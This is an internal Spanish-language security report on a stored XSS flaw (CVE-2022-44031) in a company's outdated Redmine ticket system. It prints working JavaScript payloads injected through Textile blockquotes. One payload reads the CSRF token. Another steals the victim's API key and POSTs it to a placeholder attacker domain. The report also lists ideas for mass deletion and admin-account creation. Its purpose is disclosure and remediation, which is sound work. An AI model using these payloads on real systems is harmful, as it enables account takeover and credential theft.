<h1 style="color:purple">Confidencial</h1>

Vicente Vieytes     -       27/10/23                                                              
***
## Introducción
Este informe describe una vulnerabilidad del tipo "Cross-Site Scripting Almacenado" (Stored XSS) en el sistema de tickets y gestión de proyectos utilizado por Teknos. 

El [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) es una técnica de ataque de aplicaciones web donde un atacante consigue inyectar código javascript en la aplicación de manera que el navegador de la víctima acabe ejecutandolo. En este caso se lo definiría como XSS almacenado, pues el código inyectado permanece almacenado en un ticket malicioso que es enviado por el servidor al cliente cada vez que una víctima intenta acceder al recurso.

Analizando la vulnerabilidad y simulando un ataque se consiguió robar la clave de la API de un usuario, lo que permite total acceso a los datos visibles para ese usuario. Si la victima fuera un administrador, el atacante tendría acceso y la capacidad de modificar robar o destruir todos los usuarios, tickets y proyectos del sistema.

Esto, sumado a que los tickets maliciosos pueden ser generados por algunos usuarios externos a la organización (cualquier cliente que pueda generar peticiones de soporte hacia nosotros), a que el sistema de tickets es un sistema que vendemos a algunos clientes como producto y que a la cantidad de información sensible se maneja a través de tickets es elevada hace que la vulnerabilidad conlleve un riesgo medio/alto.
## Trasfondo
El sistema de tickets está desarrollado utilizando el software open source de gestión de proyectos [redmine.org](http://redmine.org/).
La versión de redmine utilizada en el sistema de tickets es la **4.1.2**, sabiendo que esta versión está desactualizada, se utilizó el [scanner de vulnerabilidades de redmine](https://plan.io/redmine-security-scanner/results/e727fbd0-ea32-40de-8b76-5e7a0ec65e88), el cual indicó que efectivamente existían vulnerabilidades graves en la aplicación.

![[Pasted image 20231024192506.png]] 

[El security advisory de redmine](https://www.redmine.org/projects/redmine/wiki/security_advisories) lista las vulnerabilidades conocidas, y para cada vulnerabilidad la versión en la que se mitigó y las versiones afectadas.

Según el advisory, hay más de 20 vulnerabilidades informadas para redmine 4.1.2. Pero no hay detalles sobre como explotar la mayoría de estas vulnerabilidades.

La vulnerabilidad que sí se consiguió explotar está catalogada como [CVE-2022-44031](https://cve.report/CVE-2022-44031) y como defecto #3775" en el advisory, y reporta "Redmine anterior a 4.2.9 permite XSS persistente en su formateador Textile debido a falta de sanitización de la sintaxis de blockquotes."

Textile es un lenguaje de markup que redmine utiliza de forma nativa para formatear texto. En el caso del sistema de tickets, se puede utilizar para agregar elementos HTML como headers, párrafos, listas, citas o hipervínculos a los tickets. El funcionamiento se puede testear sin necesidad de publicar el ticket utilizando la pestaña "previsualizar".
![[Pasted image 20231024200155.png]]
![[Pasted image 20231024200300.png]] 
<div style="page-break-after: always;"></div>

## La vulnerabilidad
Estudiando las blockquotes generadas en textile se encontró que estas pueden contener referencias.

![[Pasted image 20231024203153.png]]
![[Pasted image 20231024203203.png]]
![[Pasted image 20231024203245.png]]

El formateador Textile toma todo el input de usuario entre "bq.:" y el primer whitespace y lo incluye entre comillas como valor del atributo *cite* en el elemento blockquote.

Este input no está sanitizado y la vulnerabilidad surge de que usando comillas se puede escapar de la declaración de valor del atributo *cite*, luego, todo lo que vaya después de estas comillas y antes del whitespace pasa a ser un atributo del elemento blockquote en el HTML.
![[Pasted image 20231027163958.png]]
![[Pasted image 20231027164016.png]]
![[Pasted image 20231027164039.png]]

Inyectar un atributo al elemento blockquote que sirva para ejecutar javascript lleva a XSS.
Por ejemplo, inyectando el atributo *onclick*="alert(1)" , la linea de código "alert(1)" es ejecutada en el browser al clickear en el blockquote.

Así se ve el issue con la inyección antes de ser formateado:
![[Pasted image 20231025093536.png]]
Así se ve la blockquote maliciosa:
![[Pasted image 20231027162907.png]]
Así se ve el HTML generado por el formateador:
![[Pasted image 20231025093553.png]]
Este es el resultado de clickear en la blockquote malicosa:
![[Pasted image 20231025093601.png]]
<div style="page-break-after: always;"></div>

## Explotación
Se encontró un punto donde se puede inyectar código javascript que será ejecutado en el browser de las víctimas. Esta vulnerabilidad es un gran punto de partida para muchos tipos de ataques. El atacante puede a partir de esta inyección de código insertar y remover datos, emitir requests autenticadas, y tomar control de la cuenta de la víctima.

Se probaron distintas cadenas de explotación para testear la resiliencia de la página contra el cross-site scripting. Se consiguió realizar CSRF, y robo de la autenticación.

En https://dev.soporte.teknosgroup.com/issues/2033 se pueden ver algunos exploits funcionales persistentes de prueba. 
### Cross-Site Request Forgery (CSRF)
La falsificación de solicitudes entre sitios (CSRF) es un ataque que obliga a un usuario final a ejecutar acciones no deseadas en una aplicación web en la que está actualmente autenticado. Un atacante puede engañar a los usuarios de una aplicación web para que ejecuten acciones no deseadas.

Si la víctima es un usuario normal, un ataque CSRF exitoso puede obligar al usuario a realizar solicitudes de cambio de estado, como transferir fondos, cambiar su dirección de correo electrónico, etc. Si la víctima es una cuenta administrativa, CSRF puede comprometer toda la aplicación web.

Referencia: [Cross Site Request Forgery (CSRF) | OWASP Foundation](https://owasp.org/www-community/attacks/csrf) 

La vulnerabilidad en tickets permite CSRF. El siguiente exploit fuerza a la víctima a hacer una GET request autenticada a /login, y en el cuerpo de la respuesta se puede ver el contenido del token CSRF. **En general, la página confía en las requests emitidas por la vulnerabilidad a recursos del mismo origen.**
```
El payload a ejecutar:
------------------
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
{if(xhr.readyState==4){prompt('hacked'+xhr.response)}};
xhr.open('GET','/login',true);
xhr.withCredentials=true;
xhr.send(null);
------------------
```

Genera un blockquote que cuando se clickea alerta el contenido de la request a /login.

![[Pasted image 20231027162632.png]]
### Exfiltrar datos
Además, **la vulnerabilidad permite emitir requests a endpoints de origen externo para exfiltrar datos mediante CSRF**.

Al exploit anterior se le agregó que luego de recibir la información, esta se enviara a un origen externo controlado por "el atacante". Esto se hace forzando al browser de la víctima a hacer una request POST con el contenido de la información obtenida a su dominio. Permitiendo así exfiltrar la información del usuario. 

Investigando la aplicación y la API de redmine, se encontró que **al hacer una GET request autenticada a /my/account.xml, se incluye la API_KEY del usuario en la respuesta**.



```
Payload a ejecutar
-------------------
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function(){
{if(xhr.readyState==4){
prompt('hacked'+xhr.response)
fetch('https://[dominioAtacante]/',{method:'POST',mode:'no-cors',body:xhr.response}
}};
xhr.open('GET','/my/account.xml',true);
xhr.withCredentials=true;
xhr.send(null);
------------------
```
![[Pasted image 20231027114730.png]]
Este contenido fue recibido por un servidor externo (en el exploit de ejemplo \[dominioAtacante\]).

**Mediante la clave de la API de la víctima se pudo tener acceso a todos los issues a los que este tiene visibilidad, además de a todas sus opciones de configuración y en general a todos los recursos para los que tenga permisos el usuario.**
### Otras posibles explotaciones
- Se podría generar un ticket malicioso que generara más tickets maliciosos que recursivamente generen más tickets. Esto podría llevar a denegación de servicio y a saturar todo el sistema de tickets con malware.
- Se podría generar un ticket malicioso que elimine todos los tickets abiertos.
- Si se ejecuta un ticket malicioso con la sesión de un administrador abierta se podrían generar nuevos usuarios administradores para acceder al sistema.
<div style="page-break-after: always;"></div>

## Generación de tickets maliciosos desde soporte.teknosgroup.com
El sistema de emisión de peticiones de clientes hacia nosotros se comunica con la API de redmine y no hay sanitización del input en el medio. Esto lleva a que desde el sistema de generación de tickets se pueda realizar el mismo XSS almacenado con un usuario de cliente y sin tener un usuario interno de la organización.

![[Pasted image 20231027121136.png]]

La request POST que se envía cuando se genera un ticket, es enviada a devhoras.teknosgroup.com/redmine/issues.json.

No está claro como esto llega luego a dev.soporte.teknosgroup.com/issues.json, pero eventualmente el ticket aparece del lado de la organización como una petición para resolver y el exploit es ejecutado.

![[Pasted image 20231027121609.png]]
<div style="page-break-after: always;"></div>

## Impacto de una post-explotación
### Información sensible en tickets
Una cuenta del módulo IT en el servidor productivo tiene visibilidad de 16400 issues de los más de 25000 que hay en el sistema. 

Los siguientes son algunos ejemplos del tipo de información a la que un atacante podría llegar a acceder luego de comprometer el sistema. Estos tickets de ejemplo son visibles para un usuario perteneciente al módulo IT, usuarios que pertenezcan a otros módulos tienen visibilidad de otros tickets y un administrador tendría visibilidad de todos los tickets.

Muchos de estos tickets contienen en las respuestas que nosotros emitimos usuarios y contraseñas en texto plano para acceder al VPN o a sistemas productivos publicados además de información de clientes, información sobre problemas de seguridad en distintos sistemas SAP de clientes, información sobre la infraestructura interna de Teknos, información sobre empleados, etc.
![[Pasted image 20231027123618.png]]
![[Pasted image 20231027123746.png]]
![[Pasted image 20231027124009.png]]
<div style="page-break-after: always;"></div>

## Probabilidad de explotación
La vulnerabilidad fue reportada en redmine en 2021 y la dificultad de la explotación no es muy elevada. Aún así, como para crear un ticket malicioso hace falta tener acceso a un usuario de soporte o cliente generador de tickets, el riesgo de la explotación baja.

Para revisar si ocurrió una posible explotación se realizó un scrapping de los tickets a los que tiene visibilidad el módulo IT. **No se encontró ningún issue entre los 16000 visibles que incluya un elemento blockquote con referencia en el cuerpo del ticket.**

**Este scrapping solo revisó un 60% de los issues del servidor productivo**, ya que la visibilidad se vio limitada a la de un usuario del módulo IT. 
```
import requests
API_ENDPOINT = "https://tickets.teknosgroup.com/issues.json"
API_KEY = "REMPLAZAR" # Reemplazar con la API key de Redmine

def fetch_issues(offset): #Se piden issues a la API de a 100
    params = {"key": API_KEY, "status_id": "*", "offset": offset, "limit": 100}
    response = requests.get(API_ENDPOINT, params=params)
    response_json = response.json()
    issues = response_json["issues"]
    filtered_issues = []
    for issue in issues:
	    if (issue["description"]!=None and "bq.:" in issue["description"]):
		    filtered_issues.append(issue) 
    if (filtered_issues != []):
        print(f"Found {len(filtered_issues)} issues")
    else:
        print(f"Found no issues on offset {offset}")
	return filtered_issues
	
offset = 0
issues = fetch_issues(offset)
with open("output.txt", "w") as f:
    while offset<25500: #Cota superior a la cantidad de issues
        print(f"Scraped {len(issues)} issues")
        f.write(str(issues))
        offset += 100
        issues = fetch_issues(offset)
print("Scraping complete")
```
<div style="page-break-after: always;"></div>

## Remediación
Se recomienda actualizar redmine de la versión 4.1.2 a la versión 4.2.11. Además de solucionar esta particular vulnerabilidad XSS, soluciona otras varias vulnerabilidades XSS que no fueron encontradas en este análisis pero que seguramente tendrían un impacto y un vector de explotación muy similar y otras vulnerabilidades totalmente distintas que se pueden ver en [el security advisory de redmine](https://www.redmine.org/projects/redmine/wiki/security_advisories).

Una alternativa mucho más débil es bloquear desde el lado de los clientes el uso de formateo y aplicar un saneamiento de input, pero esto deja afuera todas las otras vulnerabilidades del advisory.

## Referencias
[Cross-Site Scripting (XSS | OWASP Foundation](https://owasp.org/www-community/attacks/xss/)
[Cross Site Request Forgery (CSRF) | OWASP Foundation](https://owasp.org/www-community/attacks/csrf)
[Security Advisories - Redmine](https://www.redmine.org/projects/redmine/wiki/Security_Advisories)
[CVE-2022-44031](https://cve.report/CVE-2022-44031)
[Textile Markup Language Documentation (textile-lang.com)](https://textile-lang.com/)

